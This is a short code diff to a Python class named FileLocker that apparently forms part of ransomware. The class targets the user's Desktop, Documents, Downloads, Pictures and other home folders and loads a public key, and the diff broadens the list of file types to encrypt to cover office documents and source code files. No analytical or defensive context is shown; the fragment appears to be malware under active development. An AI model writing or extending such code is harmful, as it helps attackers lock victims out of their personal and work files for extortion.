@@ -12,7 +12,7 @@ class FileLocker:
     def __init__(self):
         self.home = Path.home()
         self.locations = ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos", "Public"]
-        self.encrypt_ext = ["txt", ".pdf", ".csv", ".docx", ".pptx", ".xlsx", ".jpg", ".jpeg", ".png", ".mp3", ".mp4"]
+        self.encrypt_ext = [".txt", ".pdf", ".csv", ".docx", ".doc", ".pptx", ".ppt", ".xlsx", ".xls", ".jpg", ".jpeg", ".png", ".mp3", ".mp4", ".py", ".html", ".css", ".js"]
         self.files = []
 
     def load_public_key(self):
